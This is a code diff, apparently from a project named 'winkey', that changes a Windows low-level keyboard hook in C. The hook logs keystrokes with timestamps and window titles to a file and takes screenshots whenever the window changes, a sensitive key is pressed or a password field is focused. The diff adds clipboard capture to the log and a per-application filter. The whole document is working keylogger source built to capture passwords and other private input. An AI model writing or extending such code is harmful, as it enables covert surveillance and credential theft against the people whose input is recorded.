@@ -14,47 +14,54 @@ void *which_open(char *exe)
 		CloseHandle(hd);
 	}
 }
+
+
 LRESULT CALLBACK callback_clavier(int ncode, WPARAM wp, LPARAM lp)
 {
-    static HWND last_window = NULL;
-    char exe[MAX_PATH] = {0};
-    char key[8] = {0};
-    char time[64];
-    char title[256] = {0};
+	static HWND last_window = NULL;
+	char exe[MAX_PATH] = {0};
+	char key[8] = {0};
+	char time[64];
+	char title[256] = {0};
+	char clip[1024];
 
-    if (ncode == HC_ACTION && wp == WM_KEYDOWN)
-    {
-        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lp;
-        HWND current = GetForegroundWindow();
-        if (current && current != last_window)
-        {
-            capture_screen(L"C:\\winkey_screens\\window_change.bmp");
-            last_window = current;
-        }
-        if (is_sensitive_key(kbd->vkCode))
-            capture_screen(L"C:\\winkey_screens\\sensitive_key.bmp");
-        if (is_password_field(current))
-            capture_screen(L"C:\\winkey_screens\\password_field.bmp");
-        which_open(exe);
-        get_time(time);
-        get_window_title(title);
-        int new_key = vk_to_char(kbd->vkCode, key);
-        char *spe_touch = special_touch(kbd->vkCode);
-        FILE *f = fopen("winkey.log", "a");
-        if (f)
-        {
-            fprintf(f, "[%s] - '%s'\n", time, title);
-            if (spe_touch)
-                fprintf(f, "<%s>\n", spe_touch);
-            else if (new_key)
-                fprintf(f, "%s\n", key);
-            else
-                fprintf(f, "VK(%lu)\n", kbd->vkCode);
-
-            fclose(f);
-        }
-    }
-    return CallNextHookEx(g_ouk, ncode, wp, lp);
+	if (ncode == HC_ACTION && wp == WM_KEYDOWN)
+	{
+		KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lp;
+		HWND current = GetForegroundWindow();
+		if (current && current != last_window)
+		{
+			capture_screen(L"C:\\winkey_screens\\window_change.bmp");
+			last_window = current;
+		}
+		if (is_sensitive_key(kbd->vkCode))
+			capture_screen(L"C:\\winkey_screens\\sensitive_key.bmp");
+		if (is_password_field(current))
+			capture_screen(L"C:\\winkey_screens\\password_field.bmp");
+		which_open(exe);
+		if (!allow_app(exe))
+			return (CallNextHookEx(g_ouk, ncode, wp, lp));
+		read_clipboard(clip, sizeof(clip));
+		get_time(time);
+		get_window_title(title);
+		int new_key = vk_to_char(kbd->vkCode, key);
+		char *spe_touch = special_touch(kbd->vkCode);
+		FILE *f = fopen("winkey.log", "a");
+		if (f)
+		{
+			fprintf(f, "[%s] - '%s'\n", time, title);
+			if (spe_touch)
+				fprintf(f, "<%s>\n", spe_touch);
+			else if (new_key)
+				fprintf(f, "%s\n", key);
+			else
+				fprintf(f, "VK(%lu)\n", kbd->vkCode);
+			if (clip[0] != '\0')
+				fprintf(f,"[CLIPBOARD] %s\n", clip);
+			fclose(f);
+		}
+	}
+	return CallNextHookEx(g_ouk, ncode, wp, lp);
 }
 
 
